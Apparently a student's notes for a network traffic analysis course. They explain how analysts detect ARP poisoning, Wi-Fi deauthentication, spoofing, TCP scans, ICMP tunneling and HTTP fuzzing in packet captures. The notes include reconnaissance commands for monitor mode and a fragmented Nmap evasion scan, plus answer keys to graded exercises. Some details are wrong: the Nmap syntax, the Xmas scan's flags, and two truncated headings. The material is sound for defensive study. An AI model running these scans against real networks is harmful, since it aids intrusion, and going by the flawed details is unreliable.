# INTERMEDIATE NETWORK TRAFFIC ANALYSIS

### Overview

#### Importance of Network Traffic Analysis

* Mastering network traffic analysis is critical in complex, fast-paced network environments.
* The focus spans attacks across multiple layers: **Link Layer, IP Layer, Transport Layer, Network Layer, and Application Layer**.
* Recognizing patterns in attacks equips analysts to **detect and respond effectively**.
* Additional skills:
  * **Anomaly detection techniques**
  * **Log analysis**
  * **Indicators of Compromise (IOCs)**
* Goal: Enhance proactive and reactive threat identification, reporting, and response.

#### Setup for Hands-on Exercises

* Download the pcap files: `pcap_files.zip` from the Resources section.
* Uncompress and organize files in Pwnbox

```
wget -O file.zip 'https://academy.hackthebox.com/storage/resources/pcap_files.zip'
mkdir tempdir
unzip file.zip -d tempdir
mkdir -p pcaps
mv tempdir/Intermediate_Network_Traffic_Analysis/* pcaps/
rm -r tempdir file.zip

```



## ARP Spoofing & Abnormality Detection

#### Related PCAP

* `ARP_Spoof.pcapng`

#### How ARP Works

1. Host A wants to send data to Host B and checks its **ARP cache**.
2. If IP-to-MAC mapping not found, Host A broadcasts an ARP request: _"Who has IP x.x.x.x?"_
3. Host B replies with its MAC address.
4. Host A updates its ARP cache.
5. Changes in interfaces or IP allocations may require cache updates.

#### ARP Poisoning & Spoofing

* **Attack Scenario**:
  1. Attacker sends fake ARP messages to victim and router.
  2. Messages claim attacker's MAC corresponds to router's IP (to victim) and victim's IP (to router).
  3. ARP caches are corrupted, redirecting traffic to attacker.
  4. If attacker forwards traffic, they perform a **man-in-the-middle (MITM) attack**.
  5. Additional attacks may include **DNS spoofing** or **SSL stripping**.
* **Mitigation**:
  * Use **Static ARP entries**
  * Implement **Switch and Router Port Security**

#### Capturing Traffic

* Install tcpdump if needed:

```bash
sudo apt install tcpdump -y
```

* Capture traffic:

```bash
sudo tcpdump -i eth0 -w filename.pcapng
```

#### Detecting ARP Spoofing

* Open `ARP_Spoof.pcapng` in Wireshark.
* Focus on ARP requests and replies using filter: `arp.opcode`
  * `arp.opcode == 1` → ARP Requests
  * `arp.opcode == 2` → ARP Replies
* Detect anomalies:
  * Duplicate IP addresses mapped to different MACs.
  * Filter duplicate ARP replies:

```bash
arp.duplicate-address-detected && arp.opcode == 2
```

* Investigate original IPs to confirm spoofing:

```bash
(arp.opcode) && ((eth.src == <attacker_MAC>) || (eth.dst == <attacker_MAC>))
```

* Inspect TCP connections to check for MITM or dropped packets.
* Command-line ARP check:

```bash
arp -a | grep <MAC_Address>
```

**Q1** nspect the ARP\_Poison.pcapng file, part of this module's resources, and submit the total count of ARP requests (opcode 1) that originated from the address 08:00:27:53:0c:ba as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fn60vmLlb2x1EuOOm5jRq%2FScreenshot%202025-09-15%20at%209.51.12%E2%80%AFPM.png?alt=media&#x26;token=67abd744-b608-4db9-bbb8-ff2fdee54015" alt=""><figcaption></figcaption></figure>

Answer : 507



### ARP Scanning & Denial-of-Service

#### Related PCAPs

* `ARP_Scan.pcapng`
* `ARP_Poison.pcapng`

#### ARP Scanning

* Signs:
  * Broadcast ARP requests to sequential IPs.
  * Broadcast ARP requests to non-existent hosts.
  * High volume of ARP traffic from a single host.
* Detection in Wireshark using `arp.opcode` filter.
* Often performed with scanners like **Nmap**.

#### ARP-Based Denial-of-Service

* After scanning, attackers may attempt:
  * Corrupting ARP caches across subnet.
  * Duplicating IP addresses to block traffic.
* Countermeasures:
  * **Trace and identify** the attacker's machine.
  * **Containment** by isolating affected switch/router segments.

**Q2** Inspect the ARP\_Poison.pcapng file, part of this module's resources, and submit the first MAC address that was linked with the IP 192.168.10.1 as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FXClUlfOlKNjOGQT48VSH%2FScreenshot%202025-09-15%20at%209.58.03%E2%80%AFPM.png?alt=media&#x26;token=09b771f6-2278-422e-b14e-5938fae59c2a" alt=""><figcaption></figcaption></figure>

Answer : 2c:30:33:e2:d5:c3



### 02.11 Denial-of-Service

#### Related PCAP

* `deauthandbadauth.cap`

#### Capturing 802.11 Traffic

* Requires **monitor mode** or WIDS/WIPS.
* Check interfaces:

```bash
iwconfig
```

* Enable monitor mode:
  1. Using `airmon-ng`:

```bash
sudo airmon-ng start wlan0
```

2. Using system utilities:

```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

* Capture traffic:

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> wlan0 -w raw
```

#### Deauthentication Attacks

* Attacker sends **fake deauthentication frames** to clients.
* Purpose:
  * Capture WPA handshake.
  * Cause DoS conditions.
  * Force clients to connect to malicious APs.
* Detection in Wireshark:
  * Filter by BSSID:

```bash
(wlan.bssid == <BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)
```

* Filter by **reason code 7**:

```bash
(wlan.bssid == <BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)
```

* Advanced attackers may **rotate reason codes** to evade detection.

#### Mitigation

* Enable **IEEE 802.11w** (Management Frame Protection)
* Use **WPA3-SAE**
* Update WIDS/WIPS detection rules

#### Failed Authentication Attempts

* Excessive association/authentication requests can indicate attacker activity.
* Filter example in Wireshark:

```bash
(wlan.bssid == <BSSID>) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)
```

**Q3** Inspect the deauthandbadauth.cap file, part of this module's resources, and submit the total count of deauthentication frames as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fu4cLsNnOjsZsCswVbhYt%2FScreenshot%202025-09-15%20at%2010.04.10%E2%80%AFPM.png?alt=media&#x26;token=bafe588a-9749-46a3-a97d-331230be7d91" alt=""><figcaption></figcaption></figure>

Answer : 14592



### Rogue Access Point & Evil-Twin Attacks

#### Related PCAP

* `rogueap.cap`

#### Rogue Access Points

* Installed **directly on network** to bypass controls.
* Can provide unauthorized access to restricted network sections, including air-gapped segments.
* Connected to legitimate network infrastructure.

#### Evil-Twin Access Points

* Standalone APs not connected to the network.
* Used to **harvest credentials** or act as MITM.
* Can involve hostile portal attacks.

#### Detection with Airodump-ng

* Filter by ESSID:

```bash
sudo airodump-ng -c <channel> --essid <SSID> wlan0 -w raw
```

* Monitor for **unauthorized BSSIDs** broadcasting legitimate ESSIDs.
* Detect deauthentication attacks originating from rogue or evil-twin APs.

**Q4** Inspect the rogueap.cap file, part of this module's resources, and enter the MAC address of the Evil Twin attack's victim as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fkfda1zFiYq2VHc9kl2wQ%2FScreenshot%202025-09-15%20at%2010.10.26%E2%80%AFPM.png?alt=media&#x26;token=f6c347f0-75d6-4870-b72f-ca7ea82a8357" alt=""><figcaption></figcaption></figure>

Answer :  2c:6d:c1:af:eb:91



### Fragmentation Attacks

#### Related PCAP File

* `nmap_frag_fw_bypass.pcapng`

#### IP Layer Overview

* **Purpose:** Transfers packets hop-to-hop using source and destination IPs.
* **Limitation:** Cannot detect lost, dropped, or tampered packets (handled by transport/application layers).
* **Important IPv4 Header Fields:**
  * **Length:** IP header length.
  * **Total Length:** Full IP packet length (header + data).
  * **Fragment Offset:** Instructions for reassembly of fragmented packets.
  * **Source & Destination IPs:** Identifies communicating hosts.

#### Commonly Abused Fields

* Attackers manipulate IPv4 header fields to cause communication issues.
* **Techniques:**
  * Packet malformation
  * Field modification for IDS/IPS evasion

#### Abuse of Fragmentation

* **Normal Purpose:** Splits large packets into smaller ones (based on MTU) and reassembles them at the destination.
* **Attack Scenarios:**
  1. **IDS/IPS Evasion:**
     * If IDS does not reassemble packets, fragmented scans (e.g., Nmap) may bypass detection.
  2. **Firewall Evasion:**
     * Firewalls not reassembling packets may fail to block fragmented malicious traffic.
  3. **Resource Exhaustion:**
     * Using very small MTU values (10, 15, 20…) forces network controls to attempt reassembly, possibly overwhelming resources.
  4. **Denial-of-Service (DoS):**
     * Sending oversized fragmented packets (>65,535 bytes) may cause crashes or instability on older hosts.
* **Correct Network Defense Behavior:**
  * **Delayed Reassembly:** IDS/IPS/Firewalls should wait for all fragments, reassemble, then inspect.

#### Detecting Irregular Fragment Offsets

* **Wireshark Analysis:**

```bash
wireshark nmap_frag_fw_bypass.pcapng
```

* **Indicators in PCAP:**
  * ICMP echo requests (Nmap host discovery).
  * Fragmented IP packets.
  * TCP connections with many SYN + RST patterns.

#### Example Attacker Enumeration

* Standard Nmap scan:

```bash
nmap <host ip>
```

* Fragmented Nmap scan with MTU of 10:

```bash
nmap -f 10 <host ip>
```

* **Indicators:**
  * Large number of fragmented packets from one source.
  * Destination host replies with **RST flags** for closed ports.
  * Clear pattern of **single source scanning multiple ports**.

#### Wireshark Reassembly Settings

* To improve detection, enable IPv4 reassembly:
  * Wireshark → **Preferences → Protocols → IPv4 → Reassemble fragmented datagrams**

**Q5** Inspect the nmap\_frag\_fw\_bypass.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP RST flag set as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FfkFsvbW8guS6O3J3f6l4%2FScreenshot%202025-09-15%20at%2010.22.57%E2%80%AFPM.png?alt=media&#x26;token=5faac4dd-74fa-4cdd-9cbb-f8d18e095870" alt=""><figcaption></figcaption></figure>

**Answer : 66535**



### IP Source & Destination Spoofing Attacks

#### Overview

* IPv4 and IPv6 packets may show **irregularities** in the **source and destination IP fields**.
* Important considerations for traffic analysis:
  * **Incoming traffic:** Source IP should be outside the local subnet only if it is legitimate. Suspicious external sources may indicate **packet crafting**.
  * **Outgoing traffic:** Source IP should always be within the subnet. A different range suggests **malicious activity** from inside the network.
* Spoofing attacks at the IP layer are often combined with other attacks (e.g., ARP poisoning) for greater impact.

***

#### Common Spoofing-Based Attacks

1. **Decoy Scanning**
   * Attacker spoofs the source IP to resemble a trusted host.
   * Goal: **Bypass firewall/IDS** and probe targets without revealing their true source.
   * Indicators:
     * Initial fragmentation from fake IPs.
     * Mix of traffic from spoofed and legitimate IPs.
     * Responses (RST flags) still directed to attacker.
2. **Random Source Attack (DDoS)**
   * Attacker floods victim with traffic from spoofed random IPs.
   * Goal: **Exhaust victim resources** or overload network controls.
   * Indicators:
     * High volume of ICMP/TCP traffic from many random sources.
     * Identical packet lengths.
     * Incremental base ports with little variation.
3. **LAND Attack**
   * Attacker sets **source IP = destination IP**.
   * Results in victim host responding to itself, exhausting ports and resources.
   * Commonly observed on TCP SYN floods to the same port.
4. **SMURF Attack**
   * Attacker sends ICMP requests to multiple hosts, spoofing the victim’s IP as the source.
   * All responding hosts flood the victim with ICMP replies.
   * Often amplified by including fragmentation or extra data in packets.
   * Indicators:
     * Excessive ICMP replies from many hosts directed to one victim.
     * Fragmented ICMP packets in capture.
5. **Initialization Vector Generation (WEP networks)**
   * Attacker captures, modifies, and reinjects spoofed packets.
   * Goal: Generate **initialization vectors (IVs)** to decrypt WEP traffic using statistical attacks.
   * Indicators: Large volumes of repeated packets between hosts.

***

#### Detection Techniques

* **Traffic Analysis Rules:**
  * IDS/IPS/Firewalls should **reassemble fragmented packets** like the destination host.
  * Watch for **connection takeovers**: one host initiates, but another host continues.
* **Decoy Scan Detection (PCAP: `decoy_scanning_nmap.pcapng`):**
  * Look for initial fragments from spoofed IPs.
  * Responses with RST flags to multiple closed ports.
* **Random Source Attacks (PCAPs: `ICMP_rand_source.pcapng`, `ICMP_rand_source_larg_data.pcapng`, `TCP_rand_source_attacks.pcapng`):**
  * ICMP replies from a single host to many random destinations.
  * TCP SYN floods on one port with repeated patterns.
* **LAND Attacks (PCAP: `LAND-DoS.pcapng`):**
  * Packets where source IP = destination IP.
  * High-volume TCP SYN requests to the same port (e.g., 80).
* **SMURF Attacks:**
  * Identify ICMP floods targeting a victim, originating from multiple hosts.
  * PCAP evidence shows many ICMP echo requests/replies.

**Q6** nspect the ICMP\_smurf.pcapng file, part of this module's resources, and enter the total number of attacking hosts as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FrC7k8zJcPHMXuaC5AEKb%2FScreenshot%202025-09-15%20at%2010.28.10%E2%80%AFPM.png?alt=media&#x26;token=5919f921-db2e-4547-aa53-56332d31cd7a" alt=""><figcaption></figcaption></figure>

**Answer : 1**



## P Time-to-Live (TTL) Attacks

### Related PCAP File(s)

* `ip_ttl.pcapng`

***

### Overview

* **TTL (Time-to-Live)** is an IP header field that decrements by 1 at each hop (router). When TTL reaches 0 the packet is discarded and the router usually sends an **ICMP Time Exceeded (type 11)** message back to the source.
* **TTL manipulation** is used by attackers as an **evasion technique**: they set a very low TTL so packets die before reaching inspection points (firewalls, IDS/IPS) but still trigger responses from intermediate devices or hosts that reveal service behavior.
* Typical goal: **bypass filtering / fingerprint services / perform stealthy scans**.

***

### How TTL Attacks Work (step-by-step)

1. Attacker crafts packets with a low TTL (e.g., `1`, `2`, `3`).
2. Packet traverses network hops; TTL decrements on each hop.
3. If TTL reaches `0` before the packet hits a firewall/IDS, it is dropped by an intermediate router.
4. Routers that drop the packet send an **ICMP Time Exceeded (type 11)** back to the (spoofed) source IP.
5. Attacker uses the side-effects (ICMP replies, partial responses, observed SYN/SYN-ACK behavior) to infer host/service state without traversing full path to a protected sensor.

***

### Indicators & What to Look For in a PCAP

* Packets with **unusually low `ip.ttl`** values from a single source scanning many ports/hosts.
* **ICMP Time Exceeded** messages paired with low-TTL packets.
* Presence of **SYN** packets (or other probes) with low TTL followed by:
  * **no firewall/IDS logs** (because the probe died before reaching them), or
  * **replies from intermediate devices** (ICMP type 11).
* Cases where the victim responds (SYN-ACK) even though the path TTL is low (indicates inconsistent path or filtering gaps).
* Pattern: many low-TTL probes targeted at various ports/hosts (often used with fragmented or otherwise-crafted probes).

***

### Practical Investigation (Wireshark / tshark / tcpdump)

#### Wireshark

* Open the capture:

```bash
wireshark ip_ttl.pcapng
```

* Useful display filters:

```
ip.ttl <= 3
icmp.type == 11           # ICMP Time Exceeded messages
ip.ttl <= 3 && tcp       # low-TTL packets that are TCP
ip.ttl <= 3 && icmp      # low-TTL ICMP probes
```

* Inspect packet details → **Frame / Internet Protocol / TTL** field to confirm TTL values.
* Look for ICMP Time Exceeded responses (ICMP Type = 11) that line up with low-TTL probes.

#### tshark (command line)

* List packets with TTL ≤ 3:

```bash
tshark -r ip_ttl.pcapng -Y "ip.ttl <= 3" -T fields -e frame.number -e ip.src -e ip.dst -e ip.ttl -e _ws.col.Info
```

* Count low-TTL probes:

```bash
tshark -r ip_ttl.pcapng -Y "ip.ttl <= 3" | wc -l
```

* Show ICMP Time Exceeded and correlate:

```bash
tshark -r ip_ttl.pcapng -Y "icmp.type == 11" -T fields -e frame.number -e ip.src -e ip.dst -e icmp.type
```

#### tcpdump (quick capture filter example)

* Capture packets with TTL ≤ 3 (libpcap filter supports `ip[8]` for TTL):

```bash
sudo tcpdump -n 'ip and ip[8] <= 3' -r ip_ttl.pcapng
```

***

### Detection Rules & Signatures (Examples)

* IDS/IPS rule idea (conceptual):
  * Alert when a host sends **many packets** with `ip.ttl <= N` to multiple destination ports within short time window.
* Correlate `ICMP type 11` responses with low-TTL probes — suspicious if many appear for many destinations.
* Flag unusual mixes of `low-ttl` + `fragmentation` + `SYN`/`UDP` probes.

***

### Mitigations & Hardening

1. **Filter / Drop low-TTL packets at network edge** (carefully):
   * Example: drop packets with `ip.ttl` below a tuned threshold (e.g., `< 2 or 3`) _if_ your network topology makes that safe.
   * **Caution:** Some legitimate traffic traversing long paths may have low TTL; always test to avoid false positives.
2. **Have IDS/IPS/firewall reassemble & inspect earlier hops' packets** where possible (or place sensors closer to edge).
3. **Log and rate-limit** ICMP Time Exceeded and unusual ICMP activity to make amplification/evasion attempts detectable.
4. **Deploy path-aware detection**: consider TTL distributions per host; sudden deviations from baseline TTLs are suspicious.
5. **Network segmentation** and placing detection points at choke-points reduce opportunities to die-before-inspection.
6. **Alert correlation**: combine low-TTL detection with port scan signatures, fragmentation anomalies, and ICMP type 11 bursts to reduce false positives.

***

### False Positives & Operational Notes

* Legitimate long-path traffic can have low TTL — do **not** blindly drop low-TTL packets without testing.
* Some CDNs, load balancers, or multi-hop VPNs may generate varying TTLs; baseline expected TTL ranges per host/netblock first.
* Use progressive thresholds (log first, then rate-limit, then drop) when rolling out active filtering.

***

### Example Playbook: Investigate a Suspected TTL Evasion Scan

1. Open capture in Wireshark or use `tshark` to list `ip.ttl <= 3` packets.
2. Correlate time stamps with `icmp.type == 11` responses.
3. Check source(s) and whether source IPs are internal/external and if they are spoofed.
4. Cross-check for additional anomalies (fragmentation, unusual TCP flags, port scan patterns).
5. If confirmed malicious:
   * Block or rate-limit the source(s) at the router/firewall.
   * Enhance IDS/IPS rules to alert on low-TTL scanning behavior.
   * Perform host/network forensics as required.

***

### Summary (Key Points)

* TTL attacks rely on setting packets to expire before reaching inspection to **evade detection**.
* Look for **low `ip.ttl` values**, **ICMP Time Exceeded** messages, and correlated scanning behavior.
* Use Wireshark/tshark/tcpdump to detect and quantify low-TTL probes.
* Mitigate carefully: baseline TTL behavior before dropping packets; combine multiple signals to reduce false positives.



## TCP Handshake Abnormalities

### Overview

* **Normal TCP handshake:**
  1. Client → Server: **SYN**
  2. Server → Client: **SYN/ACK**
  3. Client → Server: **ACK**
* **TCP Flags & Their Uses**
  * **URG (Urgent):** Marks urgent data.
  * **ACK (Acknowledgement):** Confirms receipt of data.
  * **PSH (Push):** Forces immediate delivery of data to application.
  * **RST (Reset):** Terminates connection abruptly.
  * **SYN (Synchronize):** Starts a TCP connection.
  * **FIN (Finish):** Gracefully ends a TCP connection.
  * **ECN (Explicit Congestion Notification):** Indicates network congestion.
* **Indicators of Abnormalities:**
  * Excessive use of certain flags (e.g., SYN floods).
  * Unusual flag combinations (e.g., Xmas scans).
  * Single attacker host scanning multiple ports/hosts.
  * Signs of evasion or reconnaissance attempts.

***

### Types of TCP Handshake Abnormalities

#### 1. Excessive SYN Flags

* **Related PCAP File:** `nmap_syn_scan.pcapng`
* **Description:**
  * Attackers send SYN packets to probe ports.
  * If port is **open** → Target responds with SYN/ACK → Attacker replies with **RST** to end connection prematurely.
  * If port is **closed** → Target responds with **RST**.
* **Attack Variants:**
  * **SYN Scan:** Sends SYNs, resets connection after SYN/ACK.
  * **SYN Stealth Scan:** Only partially completes handshake to evade detection.
* **Detection:**
  * Too many SYNs without full handshakes.
  * Large number of half-open connections.

***

#### 2. NULL Scans

* **Related PCAP File:** `nmap_null_scan.pcapng`
* **Description:** TCP packets sent with **no flags set**.
* **Behavior:**
  * If port is **open** → No response.
  * If port is **closed** → RST packet returned.
* **Detection:** Look for TCP packets with **flag field = 0x00**.

***

#### 3. Excessive ACKs

* **Related PCAP File:** `nmap_ack_scan.pcapng`
* **Description:** Attacker sends many **ACK** packets.
* **Behavior:**
  * If port is **open** → No response or RST.
  * If port is **closed** → RST.
* **Usage:** Often used to map firewall rules.

***

#### 4. FIN Scans

* **Related PCAP File:** `nmap_fin_scan.pcapng`
* **Description:** All packets carry the **FIN** flag.
* **Behavior:**
  * If port is **open** → No response.
  * If port is **closed** → RST response.
* **Detection:** Numerous FIN packets without preceding connections.

***

#### 5. Xmas Tree Scans

* **Related PCAP File:** `nmap_xmas_scan.pcapng`
* **Description:** Packets with **all flags set** (FIN, PSH, URG, RST, ACK).
* **Behavior:**
  * If port is **open** → No response, or RST.
  * If port is **closed** → RST.
* **Detection:** Very easy to spot due to unusual flag combinations.

***

### Detection in Wireshark

* **Filters:**
  * SYN floods: `tcp.flags.syn==1 && tcp.flags.ack==0`
  * NULL scans: `tcp.flags==0x000`
  * FIN scans: `tcp.flags.fin==1 && tcp.flags.ack==0`
  * Xmas scans: `tcp.flags==0x029` (common combination of FIN+PSH+URG)

***

### Mitigation Strategies

1. **Enable SYN cookies / SYN proxying** to prevent half-open connection abuse.
2. **Rate-limit unusual TCP flag patterns** (NULL, Xmas, FIN-only).
3. **Deploy IDS/IPS signatures** for nmap scan detection.
4. **Log anomalies** in TCP handshake attempts for further analysis.
5. **Correlate with source behavior** – a single host hitting multiple ports/hosts with abnormal flags is suspicious.

***

**Key Takeaway**\
TCP handshake abnormalities are strong indicators of **reconnaissance (scanning)**. By monitoring TCP flag usage and unusual connection behaviors, defenders can quickly spot nmap scans, evasion attempts, and possible attack precursors.

**Q7** Inspect the nmap\_syn\_scan.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP ACK flag set as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FBio4wLhDpA6A3upe5RmY%2FScreenshot%202025-09-15%20at%2010.33.07%E2%80%AFPM.png?alt=media&#x26;token=eb639edb-90a3-40c2-9812-60a8597978bb" alt=""><figcaption></figcaption></figure>

**Answer : 429**



## TCP Connection Resets & Hijacking

### Related PCAP File(s)

* `RST_Attack.pcapng`
* `TCP-hijacking.pcap`

***

### Summary / Purpose

This chapter explains two related threats at the TCP layer:

1. **TCP RST injection (connection termination)** — attacker injects forged TCP RST packets to abort legitimate TCP sessions (DoS / disruption).
2. **TCP connection hijacking** — attacker predicts sequence numbers and injects forged packets into an active TCP session, often combined with ACK blocking so the legitimate endpoints are unaware.

Both attacks abuse the stateless nature of TCP packet acceptance (trusting source IP/port + sequence numbers) and are frequently paired with link-layer attacks (e.g., ARP poisoning) to enable packet interception or ACK blocking.

### TCP Connection Termination (RST Injection)

#### How it works (step-by-step)

1. Attacker determines an active TCP flow (srcIP:srcPort → dstIP:dstPort).
2. Attacker forges a TCP packet with:
   * **Source IP = one endpoint** (commonly the legitimate client)
   * **Destination IP = the other endpoint** (server)
   * **Destination port = the active port**
   * **TCP flags = RST** (reset)
   * Acceptable sequence/ACK numbers (to be accepted by receiver)
3. Receiver accepts the RST and immediately terminates the connection.
4. Result: connection dropped — denial of service or disruption of a session.

#### Typical indicators in a PCAP / Wireshark

* Many **RST** packets targeting a particular port/session.
* RST packets whose **Ethernet source MAC** does **not** match the known MAC for the claimed source IP (indicates IP spoofing or host impersonation).
* Sudden stream termination with RST instead of normal FIN sequence.
* Correlation with ARP anomalies (if attacker used ARP poisoning to place themselves in path).

**Q8** Inspect the TCP-hijacking.pcap file, part of this module's resources, and enter the username that has been used through the telnet protocol as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FXY7TfhWgcaOh9pRs9f7s%2FScreenshot%202025-09-15%20at%2010.38.43%E2%80%AFPM.png?alt=media&#x26;token=b8225913-03f1-4b0e-95f1-638443ae4dfa" alt=""><figcaption></figcaption></figure>

**Answer : administrator**



## ICMP Tunneling

### Related PCAP File(s)

* `icmp_tunneling.pcapng`

***

### Overview

* **Tunneling** is a technique used by adversaries to carry covert communication inside allowed protocols to bypass network controls (firewalls, IDS/IPS).
* Common tunneling channels: **SSH**, **HTTP/HTTPS**, **DNS**, **proxies** — and **ICMP**.
* **ICMP tunneling** places attacker data inside ICMP payloads (typically Echo Request/Reply) to exfiltrate data or maintain command-and-control (C2).

***

### How ICMP Tunneling Works (step-by-step)

1. Attacker gains control of a host inside the target network (or controls a colluding host).
2. Attacker packages data to exfiltrate (files, credentials, commands).
3. Data is embedded into the **data/payload field** of ICMP Echo Request packets (Type 8).
4. Victim (or a covert agent) sends ICMP Echo Replies (Type 0) containing response data back, or an outside listener replies to receive the exfiltrated data.
5. Optionally, attacker **encodes/encrypts** the payload (Base64, custom encoding, encryption) to evade simple string inspection.
6. Large transfers often result in **fragmented IP** packets because ICMP payloads exceed typical small sizes.

***

### Indicators & What to Look For in a PCAP

* **Large ICMP payload sizes** (>> typical \~48 bytes). Example suspicious sizes: thousands or tens of thousands of bytes.
* **Frequent ICMP Echo Request/Reply pairs** between suspicious endpoints, especially where traffic volume is unexpected.
* **Fragmentation** of many ICMP packets — indicates large data being carried.
* **Readable credentials or plaintext** inside ICMP payloads (username/password strings).
* **Encoded blobs** in payload (Base64-like character sets, repeated patterns).
* **Unusual source/destination pairings** (internal host ⇄ external host using ICMP for sustained transfer).
* **Timing/volume patterns** consistent with file transfer rather than ping latency checks.

### Mitigations & Prevention

1. **Block or restrict ICMP** at network edge if business requirements allow:
   * Implement ACLs to limit ICMP to trusted internal monitoring hosts.
   * Be cautious: complete ICMP blocking can impair legitimate network diagnostics and PMTU discovery.
2. **Deep inspection of ICMP payloads** at perimeter (if possible):
   * IDS/IPS rules that inspect ICMP data beyond headers.
   * Strip or quarantine ICMP payloads that exceed normal sizes.
3. **Rate-limit and threshold** ICMP traffic per host or subnet.
4. **Detect & alert on fragmentation patterns** correlated with ICMP (large, fragmented ICMP flows).
5. **Endpoint protection & EDR:** monitor processes making raw socket/ICMP activity on hosts and alert on suspicious executables.
6. **Egress filtering / allowlists:** restrict which internal hosts can initiate ICMP to the Internet.
7. **Logging & analysis:** archive ICMP payloads (or their hashes) for forensic review if suspicious flows are detected.
8. **User / admin awareness:** educate defenders to check ICMP payload sizes and inspect hex dumps when exfiltration is suspected.

**Q9** Enter the decoded value of the base64-encoded string that was mentioned in this section as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FqXobFvvfjIzgCVL0bUGH%2FScreenshot%202025-09-15%20at%2010.44.23%E2%80%AFPM.png?alt=media&#x26;token=d002e33b-ff54-4214-b392-7905375f332e" alt=""><figcaption></figcaption></figure>

Answer : This is a secure key: Key123456789





## HTTP/HTTPs Service Enumeration Detection

### Related PCAP File(s)

* `basic_fuzzing.pcapng`

***

### Overview

* Attackers often perform **HTTP/HTTPs fuzzing** to discover hidden files, directories, or parameters in web applications.
* This is usually the first step before exploiting vulnerabilities.
* Indicators of fuzzing:
  * **Excessive HTTP/HTTPS traffic** from a single host
  * **Repeated 404 (Not Found) responses** in rapid succession
  * **Suspicious access patterns** visible in web server access logs

### Directory Fuzzing

* **Goal:** Find hidden or sensitive files (e.g., `.bash_history`, `.git`, `.config`).
* **Detection in Wireshark:**
  *   Filter all HTTP traffic:

      ```
      http
      ```
  *   Filter only HTTP requests:

      ```
      http.request
      ```

### Evasion Techniques by Attackers

* Spread requests over **longer periods** to avoid rate-based detection.
* Use **multiple IP addresses** to distribute load and hide behavior.

### Preventing Fuzzing Attempts

1. **Web Server Hardening**
   * Configure `VirtualHost` and access rules to avoid information leaks.
   * Return **generic error codes** (e.g., `403 Forbidden`) instead of detailed errors.
2. **Web Application Firewall (WAF)**
   * Block suspicious IPs that generate repeated 404/403 requests.
   * Apply rate limiting and automated detection rules.
3. **Monitoring & Logs**
   * Regularly inspect web server access logs.
   * Establish alerts for:
     * Excessive 404 errors.
     * Bursts of requests from the same source.
     * Enumeration patterns in parameters.

**Key Takeaway**\
HTTP/HTTPS service enumeration is easy to spot by monitoring for **repeated failed requests (404/403)**, analyzing **access logs**, and correlating with **Wireshark captures**. Strong logging, WAF rules, and error-handling policies are critical to prevent reconnaissance and fuzzing from escalating into real attacks.

**Q10** Inspect the basic\_fuzzing.pcapng file, part of this module's resources, and enter the total number of HTTP packets that are related to GET requests against port 80 as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FX5qSKKYPDVelcGqf4Nfb%2FScreenshot%202025-09-15%20at%2010.49.12%E2%80%AFPM.png?alt=media&#x26;token=2d5b409a-24e3-4027-8579-7ece78ece5d2" alt=""><figcaption></figcaption></figure>

**Answer : 204**



## Strange HTTP Headers

#### Overview

When analyzing web server traffic, malicious activity may not always be as obvious as fuzzing attempts. Attackers often manipulate **HTTP headers** to bypass security controls, gain unauthorized access, or probe for vulnerabilities.

#### Related PCAP File(s)

* `CRLF_and_host_header_manipulation.pcapng`

***

### Identifying Strange HTTP Headers

#### Types of Irregular Headers

* **Weird Host Headers** (e.g., `Host: 127.0.0.1`, `Host: admin`)
* **Unusual HTTP Verbs**
* **Changed User Agents**

#### Detecting Host Header Manipulation

1.  Filter HTTP traffic in Wireshark:

    ```bash
    http
    ```
2.  Identify irregular host headers by excluding the legitimate server:

    ```bash
    http.request and (!(http.host == "192.168.10.7"))
    ```

Attackers often use tools like **Burp Suite** to modify host headers before sending them to the server.

### Preventing Host Header Exploitation

* Ensure **virtualhost** or access configurations are set correctly.
* Keep the **web server updated** to mitigate known vulnerabilities.

### Analyzing Error Responses

#### Detecting Code 400 (Bad Request)

*   Filter in Wireshark:

    ```bash
    http.response.code == 400
    ```
* These errors can indicate malicious activities such as **HTTP Request Smuggling** or **CRLF injection**.

#### CVE Reference

* **CVE-2023-25690**: Related to improper request handling that enables request smuggling.

***

### Indicators of Successful Exploitation

* Detection of suspicious **Code 400 responses**.
* **Code 200 (success)** following a smuggling attempt, confirming attacker access.

